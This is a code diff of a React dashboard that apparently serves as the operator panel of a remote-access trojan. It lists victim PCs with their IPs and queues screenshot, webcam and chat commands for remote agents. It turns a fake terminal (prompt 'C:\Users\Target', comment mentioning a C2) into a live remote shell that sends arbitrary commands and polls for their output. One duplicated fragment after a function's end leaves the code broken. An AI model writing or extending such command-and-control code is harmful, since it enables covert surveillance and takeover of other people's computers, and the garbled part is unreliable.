@@ -26,6 +26,11 @@ export default function Dashboard() {
   const [showTerminal, setShowTerminal] = useState(false);
   const [terminalOutput, setTerminalOutput] = useState<string[]>(["Microsoft Windows [Version 10.0.19045.4412]", "(c) Microsoft Corporation. Tous droits réservés.", ""]);
   const [terminalInput, setTerminalInput] = useState("");
+  const [showVoice, setShowVoice] = useState(false);
+  const [isAdminMute, setIsAdminMute] = useState(false);
+  const [isAdminDeaf, setIsAdminDeaf] = useState(false);
+  const [isPcSpeaking, setIsPcSpeaking] = useState(false);
+  const [isAdminSpeaking, setIsAdminSpeaking] = useState(false);
 
   useEffect(() => {
     const fetchComputers = async () => {
@@ -83,14 +88,12 @@ export default function Dashboard() {
   };
 
   const fetchScreenshots = async (pcName: string) => {
-    const { data, error } = await supabase.storage.from('kerchak-assets').list('', {
+    const { data } = await supabase.storage.from('kerchak-assets').list('', {
       limit: 10,
       offset: 0,
       sortBy: { column: 'created_at', order: 'desc' },
     });
-
     if (data) {
-      // Filtrer les images qui commencent par le nom du PC
       const pcFiles = data.filter(f => f.name.startsWith(pcName));
       const urls = pcFiles.map(f => {
         const { data: urlData } = supabase.storage.from('kerchak-assets').getPublicUrl(f.name);
@@ -100,19 +103,33 @@ export default function Dashboard() {
     }
   };
 
-  const sendCommand = async (pcId: string, pcName: string, cmd: string, args: any = {}) => {
-    await supabase.from('commands').insert({ computer_id: pcId, command: cmd, args, status: 'pending' });
+  const sendCommand = async (pcId: string, pcName: string, cmd: string, args: string = "") => {
+    setSelectedPc(pcId);
+    setSelectedPcName(pcName);
+    
+    await supabase.from('commands').insert({ 
+      computer_id: pcId, 
+      command: cmd, 
+      args: args, 
+      status: 'pending' 
+    });
     
     if (cmd === 'ss' || cmd === 'webcam') {
-      setSelectedPc(pcId);
-      setSelectedPcName(pcName);
       setActiveModal('screenshot');
-      // Rafraichir les images apres un petit délai pour laisser l'agent uploader
       setTimeout(() => fetchScreenshots(pcName), 5000);
     } else if (cmd === 'chat_open') {
-      setSelectedPc(pcId);
-      setSelectedPcName(pcName);
       setActiveModal('chat');
+    }
+  };
+
+    if (data) {
+      // Filtrer les images qui commencent par le nom du PC
+      const pcFiles = data.filter(f => f.name.startsWith(pcName));
+      const urls = pcFiles.map(f => {
+        const { data: urlData } = supabase.storage.from('kerchak-assets').getPublicUrl(f.name);
+        return urlData.publicUrl;
+      });
+      setScreenshots(urls);
     }
   };
 
@@ -181,9 +198,9 @@ export default function Dashboard() {
                   </h3>
                   <p className="text-xs text-gray-400 mt-1">{pc.public_ip}</p>
                 </div>
-                <div className="flex items-center gap-2">
-                  <div className={`w-2.5 h-2.5 rounded-full ${isOnline(pc.last_seen) ? 'bg-green-500 shadow-[0_0_10px_#22c55e] animate-pulse' : 'bg-gray-600'}`}></div>
-                  <button onClick={() => deleteComputer(pc.id, pc.pc_name)} className="text-gray-500 hover:text-red-500 transition-colors" title="Delete PC"><X size={18}/></button>
+                <div className="flex items-center gap-3">
+                  <div className={`w-3 h-3 rounded-full ${isOnline(pc.last_seen) ? 'bg-green-500 shadow-[0_0_15px_#22c55e] animate-pulse' : 'bg-gray-600'}`}></div>
+                  <button onClick={() => deleteComputer(pc.id, pc.pc_name)} className="text-gray-500 hover:text-red-500 transition-colors" title="Delete PC"><X size={20}/></button>
                 </div>
               </div>
               <div className="grid grid-cols-2 gap-4 mb-6">
@@ -209,7 +226,7 @@ export default function Dashboard() {
               <div className="grid grid-cols-4 gap-2">
                 <button onClick={() => sendCommand(pc.id, pc.pc_name, 'ss')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-blue-400 transition-colors" title="Screenshot"><Camera size={18}/></button>
                 <button onClick={() => sendCommand(pc.id, pc.pc_name, 'webcam')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-purple-400 transition-colors" title="Webcam"><Monitor size={18}/></button>
-                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'audio')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-yellow-400 transition-colors" title="Record Audio"><Mic size={18}/></button>
+                <button onClick={() => { setSelectedPc(pc.id); setSelectedPcName(pc.pc_name); setShowVoice(true); }} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-yellow-400 transition-colors" title="Discord Voice"><Mic size={18}/></button>
                 <button onClick={() => sendCommand(pc.id, pc.pc_name, 'chat_open')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-pink-400 transition-colors" title="Chat Box"><MessageSquare size={18}/></button>
                 
                 <button onClick={() => { setActivePC(pc.pc_name); setShowTerminal(true); }} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-gray-300 transition-colors" title="Open Terminal (CMD)"><Terminal size={18}/></button>
@@ -270,7 +287,39 @@ export default function Dashboard() {
           </div>
         </div>
       )}
-      {/* Terminal Modal */}
+      {/* Discord Voice Modal */}
+      {showVoice && (
+        <div className="fixed inset-0 bg-black/90 backdrop-blur-xl z-50 flex items-center justify-center p-4">
+          <div className="w-full max-w-2xl bg-[#313338] rounded-2xl shadow-2xl overflow-hidden border border-white/5">
+            <div className="p-6 flex flex-col items-center">
+              <h2 className="text-white font-bold mb-8 flex items-center gap-2"><Mic className="text-green-500" /> Salon vocal - {selectedPcName}</h2>
+              
+              <div className="flex gap-16 mb-12">
+                <div className="flex flex-col items-center gap-3">
+                  <div className={`w-24 h-24 rounded-full bg-red-600 flex items-center justify-center border-4 transition-all duration-300 ${isAdminSpeaking ? 'border-green-500 scale-110 shadow-[0_0_20px_#22c55e]' : 'border-transparent'}`}>
+                    <span className="text-2xl font-bold text-white">AD</span>
+                  </div>
+                  <span className="text-gray-300 font-medium">Moi (Admin)</span>
+                </div>
+
+                <div className="flex flex-col items-center gap-3">
+                  <div className={`w-24 h-24 rounded-full bg-gray-700 flex items-center justify-center border-4 transition-all duration-300 ${isPcSpeaking ? 'border-green-500 scale-110 shadow-[0_0_20px_#22c55e]' : 'border-transparent'}`}>
+                    <Monitor className="text-gray-400" size={40} />
+                  </div>
+                  <span className="text-gray-300 font-medium">{selectedPcName?.split(' / ')[1]}</span>
+                </div>
+              </div>
+
+              <div className="flex gap-4 bg-[#1e1f22] p-4 rounded-2xl border border-white/5 w-full justify-center">
+                <button onClick={() => setIsAdminMute(!isAdminMute)} className={`p-4 rounded-xl transition-all ${isAdminMute ? 'bg-red-500 text-white' : 'bg-[#2b2d31] text-gray-300 hover:bg-[#35373c]'}`}><Mic size={24} /></button>
+                <button onClick={() => setIsAdminDeaf(!isAdminDeaf)} className={`p-4 rounded-xl transition-all ${isAdminDeaf ? 'bg-red-500 text-white' : 'bg-[#2b2d31] text-gray-300 hover:bg-[#35373c]'}`}><Power size={24} /></button>
+                <button className="p-4 rounded-xl bg-[#2b2d31] text-gray-300 hover:bg-[#35373c]"><Camera size={24} /></button>
+                <button onClick={() => setShowVoice(false)} className="p-4 rounded-xl bg-red-500 text-white hover:bg-red-600 ml-8">Déconnexion</button>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
       {showTerminal && (
         <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
           <div className="w-full max-w-4xl bg-[#0c0c0c] rounded-lg border border-gray-700 shadow-2xl overflow-hidden font-mono">
@@ -286,17 +335,36 @@ export default function Dashboard() {
                 <div key={i} className="min-h-[1.2rem]">{line}</div>
               ))}
               <div className="flex gap-2 items-center mt-2">
-                <span className="text-gray-400">C:\Users\Target\Desktop&gt;</span>
+                <span className="text-gray-400">C:\Users\{activePC?.split(' / ')[1] || 'Target'}&gt;</span>
                 <input 
                   autoFocus
                   className="bg-transparent border-none outline-none flex-1 text-gray-200"
                   value={terminalInput}
                   onChange={(e) => setTerminalInput(e.target.value)}
-                  onKeyDown={(e) => {
+                  onKeyDown={async (e) => {
                     if (e.key === 'Enter' && terminalInput) {
-                      setTerminalOutput([...terminalOutput, `C:\\Users\\Target\\Desktop>${terminalInput}`, "Executing command on remote agent..."]);
+                      const cmd = terminalInput;
+                      setTerminalOutput([...terminalOutput, `C:\\Users\\${activePC?.split(' / ')[1] || 'Target'}>${cmd}`]);
                       setTerminalInput("");
-                      // Ici on enverra la vraie commande au C2 plus tard
+                      
+                      const { data } = await supabase.from('commands').insert({
+                        computer_id: computers.find(c => c.pc_name === activePC)?.id,
+                        command: 'cmd',
+                        args: cmd,
+                        status: 'pending'
+                      }).select().single();
+
+                      if (data) {
+                        // Polling pour le resultat
+                        const checkResult = setInterval(async () => {
+                          const { data: cmdData } = await supabase.from('commands').select('result, status').eq('id', data.id).single();
+                          if (cmdData?.status === 'executed' && cmdData.result) {
+                            setTerminalOutput(prev => [...prev, cmdData.result, ""]);
+                            clearInterval(checkResult);
+                          }
+                        }, 2000);
+                        setTimeout(() => clearInterval(checkResult), 30000); // Timeout 30s
+                      }
                     }
                   }}
                 />
